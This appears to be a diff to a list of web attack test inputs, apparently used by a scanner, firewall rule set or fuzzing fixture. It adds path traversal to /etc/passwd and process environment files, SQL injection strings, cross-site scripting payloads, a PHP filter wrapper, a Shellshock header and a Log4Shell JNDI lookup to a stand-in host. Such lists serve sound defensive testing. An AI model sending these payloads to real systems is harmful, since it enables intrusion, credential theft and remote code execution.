@@ -1,4 +1,14 @@
 PATH /../../etc/passwd
+PATH /etc/passwd
+PATH /%2e%2e/%2e%2e/etc/passwd
+PATH /proc/self/environ
+PATH /app/.git/config
 QUERY q=UNION SELECT password
-HEADER user-agent: curl; /bin/sh
+QUERY q=1' OR '1'='1
+QUERY q=1 OR 1=1
+QUERY q=javascript:alert(1)
+QUERY file=php://filter
+HEADER user-agent: () { :; };
+HEADER ${jndi:ldap://evil}
 BODY <script>alert(1)</script>
+BODY <iframe src=javascript:alert(1)>
